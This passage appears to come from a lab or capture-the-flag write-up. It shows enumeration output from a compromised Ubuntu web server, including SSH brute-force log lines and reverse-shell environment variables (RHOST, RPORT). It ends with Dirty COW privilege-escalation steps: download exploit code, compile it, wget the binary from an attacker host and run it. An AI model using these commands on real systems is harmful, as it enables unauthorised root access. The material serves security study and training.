  /var/log/auth.log.1:Nov 15 06:19:29 ubuntu sshd[1226]: Failed password for invalid user shell from 10.0.1.14 port 54882 ssh2
  /var/log/auth.log.1:Nov 15 06:19:33 ubuntu sshd[1226]: Failed password for invalid user shell from 10.0.1.14 port 54882 ssh2
  /var/log/auth.log.1:Nov 15 17:17:15 ubuntu sshd[31162]: Failed password for invalid user HEHEHA from 10.0.1.3 port 60660 ssh2
  /var/log/auth.log.1:Nov 15 17:42:50 ubuntu sudo: pam_unix(sudo:auth): auth could not identify password for [www-data]
  /var/log/auth.log.1:Nov 15 17:42:50 ubuntu sudo: www-data : command not allowed ; TTY=unknown ; PWD=/tmp ; USER=root ; COMMAND=list
  /var/log/auth.log.1:Nov 15 17:44:35 ubuntu sudo: pam_unix(sudo:auth): auth could not identify password for [www-data]
  /var/log/auth.log.1:Nov 15 17:44:35 ubuntu sudo: www-data : command not allowed ; TTY=unknown ; PWD=/tmp ; USER=root ; COMMAND=list
  /var/log/auth.log.1:Nov 15 17:52:36 ubuntu sudo: www-data : command not allowed ; TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=list
  /var/log/auth.log.1:Nov 15 18:05:08 ubuntu sudo: www-data : user NOT in sudoers ; TTY=pts/0 ; PWD=/bin ; USER=#-1 ; COMMAND=/bin/bash
  /var/log/auth.log.1:Nov 15 19:03:21 ubuntu sshd[102904]: Failed password for invalid user kali from 10.0.1.12 port 40058 ssh2
  /var/log/auth.log.1:Nov 15 19:03:34 ubuntu sshd[102906]: Failed password for invalid user webmaster from 10.0.1.12 port 40068 ssh2
  /var/log/auth.log.1:Nov 15 19:03:52 ubuntu sshd[102906]: Failed password for invalid user webmaster from 10.0.1.12 port 40068 ssh2
  /var/log/auth.log.1:Nov 15 19:04:18 ubuntu sshd[102910]: Failed password for invalid user webmaster from 10.0.1.12 port 41058 ssh2
  /var/log/auth.log.1:Nov 15 19:04:18 ubuntu sshd[102911]: Failed password for invalid user webmaster from 10.0.1.12 port 41038 ssh2
  /var/log/auth.log.1:Nov 15 19:04:18 ubuntu sshd[102912]: Failed password for invalid user webmaster from 10.0.1.12 port 41040 ssh2
  /var/log/auth.log.1:Nov 15 19:04:18 ubuntu sshd[102913]: Failed password for invalid user webmaster from 10.0.1.12 port 41052 ssh2
  /var/log/auth.log.1:Nov 15 19:04:20 ubuntu sshd[102910]: Failed password for invalid user webmaster from 10.0.1.12 port 41058 ssh2
  /var/log/auth.log.1:Nov 15 19:04:20 ubuntu sshd[102911]: Failed password for invalid user webmaster from 10.0.1.12 port 41038 ssh2
  /var/log/auth.log.1:Nov 15 19:04:20 ubuntu sshd[102912]: Failed password for invalid user webmaster from 10.0.1.12 port 41040 ssh2
  /var/log/auth.log.1:Nov 15 19:04:20 ubuntu sshd[102913]: Failed password for invalid user webmaster from 10.0.1.12 port 41052 ssh2
  /var/log/auth.log.1:Nov 15 19:04:22 ubuntu sshd[102910]: Failed password for invalid user webmaster from 10.0.1.12 port 41058 ssh2
  /var/log/auth.log.1:Nov 15 19:04:22 ubuntu sshd[102911]: Failed password for invalid user webmaster from 10.0.1.12 port 41038 ssh2
  /var/log/auth.log.1:Nov 15 19:04:22 ubuntu sshd[102912]: Failed password for invalid user webmaster from 10.0.1.12 port 41040 ssh2
  /var/log/auth.log.1:Nov 15 19:04:22 ubuntu sshd[102913]: Failed password for invalid user webmaster from 10.0.1.12 port 41052 ssh2
  /var/log/auth.log.1:Nov 15 19:04:24 ubuntu sshd[102910]: Failed password for invalid user webmaster from 10.0.1.12 port 41058 ssh2
  /var/log/auth.log.1:Nov 15 19:04:24 ubuntu sshd[102911]: Failed password for invalid user webmaster from 10.0.1.12 port 41038 ssh2
  /var/log/auth.log.1:Nov 15 19:04:24 ubuntu sshd[102912]: Failed password for invalid user webmaster from 10.0.1.12 port 41040 ssh2
  write error
  /var/log/auth.log.1:Nov 15 19:04:24 ubuntu sshd[102913]: Failed password for invalid user webmaster from 10.0.1.12 port 41052 ssh2
  /var/log/auth.log.1:Nov 15 19:04:26 ubuntu sshd[102910]: Failed password for invalid user webmaster from 10.0.1.12 port 41058 ssh2
  /var/log/auth.log.1:Nov 15 19:04:26 ubuntu sshd[102911]: Failed password for invalid user webmaster from 10.0.1.12 port 41038 ssh2
  /var/log/auth.log.1:Nov 15 19:04:26 ubuntu sshd[102912]: Failed password for invalid user webmaster from 10.0.1.12 port 41040 ssh2
  /var/log/auth.log.1:Nov 15 19:04:26 ubuntu sshd[102913]: Failed password for invalid user webmaster from 10.0.1.12 port 41052 ssh2
  /var/log/auth.log.1:Nov 15 19:04:28 ubuntu sshd[102910]: Failed password for invalid user webmaster from 10.0.1.12 port 41058 ssh2
  /var/log/auth.log.1:Nov 15 19:04:28 ubuntu sshd[102911]: Failed password for invalid user webmaster from 10.0.1.12 port 41038 ssh2
  /var/log/auth.log.1:Nov 15 19:04:28 ubuntu sshd[102912]: Failed password for invalid user webmaster from 10.0.1.12 port 41040 ssh2
  /var/log/auth.log.1:Nov 15 19:04:28 ubuntu sshd[102913]: Failed password for invalid user webmaster from 10.0.1.12 port 41052 ssh2
  /var/log/auth.log.1:Nov 15 19:04:30 ubuntu sshd[102918]: Failed password for invalid user webmaster from 10.0.1.12 port 59876 ssh2
  /var/log/auth.log.1:Nov 15 19:04:30 ubuntu sshd[102919]: Failed password for invalid user webmaster from 10.0.1.12 port 59878 ssh2
  /var/log/auth.log.1:Nov 15 19:04:30 ubuntu sshd[102920]: Failed password for invalid user webmaster from 10.0.1.12 port 59894 ssh2
  /var/log/auth.log.1:Nov 15 19:04:30 ubuntu sshd[102921]: Failed password for invalid user webmaster from 10.0.1.12 port 59906 ssh2
  /var/log/auth.log.1:Nov 15 19:04:32 ubuntu sshd[102918]: Failed password for invalid user webmaster from 10.0.1.12 port 59876 ssh2
  /var/log/auth.log.1:Nov 15 19:04:32 ubuntu sshd[102919]: Failed password for invalid user webmaster from 10.0.1.12 port 59878 ssh2
  /var/log/auth.log.1:Nov 15 19:04:32 ubuntu sshd[102920]: Failed password for invalid user webmaster from 10.0.1.12 port 59894 ssh2
  /var/log/auth.log.1:Nov 15 19:04:32 ubuntu sshd[102921]: Failed password for invalid user webmaster from 10.0.1.12 port 59906 ssh2
  /var/log/auth.log.1:Nov 15 19:04:34 ubuntu sshd[102918]: Failed password for invalid user webmaster from 10.0.1.12 port 59876 ssh2
  /var/log/auth.log.1:Nov 15 19:04:34 ubuntu sshd[102919]: Failed password for invalid user webmaster from 10.0.1.12 port 59878 ssh2
  /var/log/auth.log.1:Nov 15 19:04:34 ubuntu sshd[102920]: Failed password for invalid user webmaster from 10.0.1.12 port 59894 ssh2
  /var/log/auth.log.1:Nov 15 19:04:34 ubuntu sshd[102921]: Failed password for invalid user webmaster from 10.0.1.12 port 59906 ssh2
  /var/log/auth.log.1:Nov 15 19:04:36 ubuntu sshd[102918]: Failed password for invalid user webmaster from 10.0.1.12 port 59876 ssh2
  /var/log/auth.log.1:Nov 15 19:04:36 ubuntu sshd[102919]: Failed password for invalid user webmaster from 10.0.1.12 port 59878 ssh2
  /var/log/auth.log.1:Nov 15 19:04:36 ubuntu sshd[102920]: Failed password for invalid user webmaster from 10.0.1.12 port 59894 ssh2
  /var/log/auth.log.1:Nov 15 19:04:36 ubuntu sshd[102921]: Failed password for invalid user webmaster from 10.0.1.12 port 59906 ssh2
  /var/log/auth.log.1:Nov 15 19:04:38 ubuntu sshd[102918]: Failed password for invalid user webmaster from 10.0.1.12 port 59876 ssh2
  /var/log/auth.log.1:Nov 15 19:04:38 ubuntu sshd[102919]: Failed password for invalid user webmaster from 10.0.1.12 port 59878 ssh2
  /var/log/auth.log.1:Nov 15 19:04:38 ubuntu sshd[102920]: Failed password for invalid user webmaster from 10.0.1.12 port 59894 ssh2
  /var/log/auth.log.1:Nov 15 19:04:38 ubuntu sshd[102921]: Failed password for invalid user webmaster from 10.0.1.12 port 59906 ssh2
  /var/log/auth.log.1:Nov 15 19:04:40 ubuntu sshd[102918]: Failed password for invalid user webmaster from 10.0.1.12 port 59876 ssh2
  /var/log/auth.log.1:Nov 15 19:04:40 ubuntu sshd[102919]: Failed password for invalid user webmaster from 10.0.1.12 port 59878 ssh2
  /var/log/auth.log.1:Nov 15 19:04:40 ubuntu sshd[102920]: Failed password for invalid user webmaster from 10.0.1.12 port 59894 ssh2
  /var/log/auth.log.1:Nov 15 19:04:40 ubuntu sshd[102921]: Failed password for invalid user webmaster from 10.0.1.12 port 59906 ssh2
  /var/log/auth.log.1:Nov 15 19:04:42 ubuntu sshd[102926]: Failed password for invalid user webmaster from 10.0.1.12 port 41338 ssh2
  /var/log/auth.log.1:Nov 15 19:04:42 ubuntu sshd[102928]: Failed password for invalid user webmaster from 10.0.1.12 port 41350 ssh2
  /var/log/auth.log.1:Nov 15 19:04:42 ubuntu sshd[102929]: Failed password for invalid user webmaster from 10.0.1.12 port 41356 ssh2
  /var/log/auth.log.1:Nov 15 19:04:42 ubuntu sshd[102930]: Failed password for invalid user webmaster from 10.0.1.12 port 41368 ssh2
  /var/log/auth.log.1:Nov 15 19:04:44 ubuntu sshd[102926]: Failed password for invalid user webmaster from 10.0.1.12 port 41338 ssh2
  /var/log/auth.log.1:Nov 15 19:04:44 ubuntu sshd[102928]: Failed password for invalid user webmaster from 10.0.1.12 port 41350 ssh2
  uniq: write error: Broken pipe

  ╔══════════╣ Checking all env variables in /proc/*/environ removing duplicates and filtering out useless env vars
                                                                                                                                  
  APACHE_LOCK_DIR=/var/lock/apache2
  APACHE_LOG_DIR=/var/log/apache2
  APACHE_PID_FILE=/var/run/apache2/apache2.pid
  APACHE_RUN_DIR=/var/run/apache2
  APACHE_RUN_GROUP=www-data
  APACHE_RUN_USER=www-data
  LANG=C
  OLDPWD=/tmp
  OLDPWD=/tmp/test
  OLDPWD=/var/www/html/antibot_image/antibots
  PWD=/
  PWD=/tmp
  PWD=/tmp/test
  PWD=/tmp/test-pedro
  PWD=/var/www/html/antibot_image/antibots
  RHOST=10.0.1.5
  RPORT=9002
  SHLVL=1
  SHLVL=2
  _=/bin/dd
  _=/bin/grep
  _=/bin/sh
  _=/usr/bin/xxd


                                  ╔════════════════╗
  ════════════════════════════════╣ API Keys Regex ╠════════════════════════════════                                               
                                  ╚════════════════╝                                                                               
  Regexes to search for API keys aren't activated, use param '-r' 
```

##### dirtycow

```bash
  # On attacking machine
  ## Download the exploit code
  $ wget https://www.exploit-db.com/download/40839 -O dirtycow.c

  ## Compile the exploit code
  $ gcc -pthread dirtycow.c -o dirtycow -lcrypt

  # On target machine
  ## Get bin
  $ wget 10.0.1.5/dirtycow

  # Run the exploit
  $ ./dirtycow
```

